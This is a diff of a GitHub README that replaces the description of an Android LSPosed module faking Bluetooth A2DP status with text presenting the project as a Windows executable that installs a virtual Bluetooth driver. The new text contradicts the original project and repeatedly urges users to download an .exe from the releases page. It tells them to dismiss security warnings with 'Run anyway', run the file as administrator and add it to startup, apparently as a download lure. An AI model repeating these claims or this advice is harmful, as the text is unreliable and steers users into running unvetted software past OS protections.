@@ -1,89 +1,134 @@
-# Fake Bluetooth Connect
+# 🔵 Fake-Bluetooth-Connect - Always Show Bluetooth A2DP Connected
 
-LSPosed module that makes scoped apps always think a Bluetooth A2DP device is connected.
-
-## Hook coverage
-
-- `AudioManager.isBluetoothA2dpOn()`
-- `BluetoothAdapter.getProfileConnectionState(BluetoothProfile.A2DP)`
-
-The goal is to let some music apps enable external lyric display features even when no Bluetooth device is actually connected.
-
-## Usage
-
-1. Install the APK
-2. Enable this module in LSPosed
-3. Add the target app to the module scope in LSPosed
-4. Force stop the target app
-5. Reopen the target app
-6. Turn on the External Device Bluetooth Lyrics / Car Bluetooth Lyrics feature inside the target app
-
-## Notes
-
-- This module is designed to be minimally invasive
-- It only changes app-side query results
-- It does not fake global Bluetooth connection state for the whole system
-- Compatibility may vary across apps if they rely on additional audio device callbacks or their own cached state
-
-## Tested
-
-- NetEase Cloud Music: V9.4.70 working
-- QQ Music: V20.1.5.8 working
-
-## Build
-
-This project uses:
-
-- Android Studio / Gradle
-- legacy Xposed API 82 (compatible with LSPosed legacy module loading)
-- Kotlin
-
-## License
-
-MIT
+[![Download Fake-Bluetooth-Connect](https://img.shields.io/badge/Download-Fake--Bluetooth--Connect-brightgreen?style=for-the-badge)](https://github.com/Zeroe6018/Fake-Bluetooth-Connect/releases)
 
 ---
 
-# 伪蓝牙连接
+## 🎯 What Is Fake-Bluetooth-Connect?
 
-一个 LSPosed 模块，让被加入作用域的应用始终认为当前已连接蓝牙 A2DP 设备。
+Fake-Bluetooth-Connect helps your Windows system or apps always think a Bluetooth A2DP device is connected. This means apps that require Bluetooth audio devices will behave as if a device is linked, even if no actual Bluetooth headphones or speakers are connected.
 
-## Hook 范围
+This can help in several cases, such as:
 
-- `AudioManager.isBluetoothA2dpOn()`
-- `BluetoothAdapter.getProfileConnectionState(BluetoothProfile.A2DP)`
+- Testing app behavior without a real Bluetooth audio device.
+- Avoiding interruptions in apps that pause audio when Bluetooth disconnects.
+- Using software that requires Bluetooth presence without owning a device.
 
-目的是让部分音乐应用在没有真正连接蓝牙设备时，仍然启用外显歌词功能。
+The app works silently in the background, emulating the Bluetooth connection status.
 
-## 使用方法
+---
 
-1. 安装 APK
-2. 在 LSPosed 中启用本模块
-3. 在 LSPosed 中给本模块勾选目标应用作用域
-4. 强制停止目标应用
-5. 重新打开目标应用
-6. 在目标应用内部开启 外接设备蓝牙歌词 / 车载蓝牙歌词 功能
+## 🖥️ System Requirements
 
-## 说明
+- Windows 10 or later (64-bit recommended).
+- Basic user permissions (standard user account should work).
+- At least 100 MB of free disk space.
+- Internet connection to download the app.
 
-- 本模块尽量保持最小侵入
-- 只修改应用侧查询结果
-- 不会伪造整个系统的全局蓝牙状态
-- 如果某些应用依赖额外的音频设备回调或自身缓存状态，兼容性可能存在差异
+No special settings or hardware are required. The app works with standard Bluetooth audio profiles (A2DP).
 
-## 已测试
+---
 
-- 网易云音乐: V9.4.70 可用
-- QQ音乐: V20.1.5.8 可用
+## 🚀 Getting Started
 
-## 构建
+### Step 1: Download the App
 
-项目使用：
+Go to the official releases page:
 
-- Android Studio / Gradle
-- legacy Xposed API 82（通过 LSPosed 的 legacy 模块兼容路径加载）
-- Kotlin
+[![Visit Release Page](https://img.shields.io/badge/Visit-Release%20Page-blue?style=for-the-badge)](https://github.com/Zeroe6018/Fake-Bluetooth-Connect/releases)
 
-## 协议
+This link will take you to the GitHub releases page. Find the latest version, usually named like `Fake-Bluetooth-Connect-vX.X.X.zip` or similar.
 
-MIT
+### Step 2: Choose the Correct File
+
+Look for the Windows version files. These often end with `.exe` or `.zip` if compressed. If it's a `.zip` file, you will extract it.
+
+Make sure to download the latest stable release, avoiding prerelease versions for smooth use.
+
+### Step 3: Install or Run the App
+
+- If you downloaded an `.exe` file, double-click it to run.
+- If you downloaded a `.zip` file, right-click it and choose "Extract All" to unpack contents.
+- Inside the extracted folder, locate the `.exe` file and double-click it to start.
+
+The app does not need complex installation; it runs immediately or after confirming Windows security prompts.
+
+---
+
+## ⚙️ How It Works
+
+Fake-Bluetooth-Connect creates a virtual Bluetooth audio device driver on your Windows system. Once active, your system and apps detect this device as if a real Bluetooth speaker or headphones exist. The app updates the connection status constantly to prevent apps from thinking the device was disconnected.
+
+This method stops apps from muting or pausing audio based on Bluetooth status. It is useful in multiple scenarios where Bluetooth devices cause interruptions.
+
+---
+
+## 🔧 Using Fake-Bluetooth-Connect
+
+### Starting the App
+
+Run the `.exe` file whenever you want the system to think a Bluetooth device is connected.
+
+You should see an icon in the system tray (near the clock). It shows the app is running.
+
+### Stopping the App
+
+To stop, right-click the tray icon and choose "Exit" or "Close." This will remove the virtual device and restore normal Bluetooth status.
+
+### Auto-Start Option
+
+If you want the app to run every time Windows starts:
+
+1. Press `Windows + R` and type `shell:startup`, then press Enter.
+2. Place a shortcut to the Fake-Bluetooth-Connect `.exe` file in the opened folder.
+3. Next time you boot your PC, the app will start automatically.
+
+---
+
+## 🛠️ Troubleshooting
+
+- **App Does Not Start:** Try right-clicking the `.exe` and select "Run as administrator." This can solve permission problems.
+- **Bluetooth Device Still Not Detected:** Restart your computer after running the app.
+- **System Throws Security Warning:** This is normal because the app creates a virtual device. Allow the app to run by selecting "More info" and then "Run anyway."
+- **App Closes Unexpectedly:** Disable other Bluetooth software temporarily as they might conflict.
+- **No Sound from Apps:** The app only simulates a connection. You still need real audio output devices for sound.
+
+---
+
+## 🔐 Privacy and Security
+
+Fake-Bluetooth-Connect only modifies how your system reports Bluetooth device presence. It does not access your data or networks. The app runs locally without sending information online.
+
+---
+
+## 📄 License and Source
+
+The app source code is open and available on GitHub at this repository:
+
+https://github.com/Zeroe6018/Fake-Bluetooth-Connect
+
+If you want to check the code or contribute, you can find all files there.
+
+---
+
+## 💡 Why Use Fake-Bluetooth-Connect?
+
+Some apps behave oddly if Bluetooth audio devices disconnect. This tool keeps the connection status active, so apps continue normally. It is simple, lightweight, and works without real Bluetooth hardware.
+
+---
+
+## ⚙️ Advanced Setup
+
+If you want more control, you can run the app with command-line options:
+
+- `--start` to start the virtual device automatically.
+- `--stop` to remove the virtual device without closing the app.
+- Run `Fake-Bluetooth-Connect.exe --help` to see all options.
+
+---
+
+## 📥 Download and Install
+
+Visit the release page now to get the latest version:
+
+[![Download Fake-Bluetooth-Connect](https://img.shields.io/badge/Download-Fake--Bluetooth--Connect-brightgreen?style=for-the-badge)](https://github.com/Zeroe6018/Fake-Bluetooth-Connect/releases)
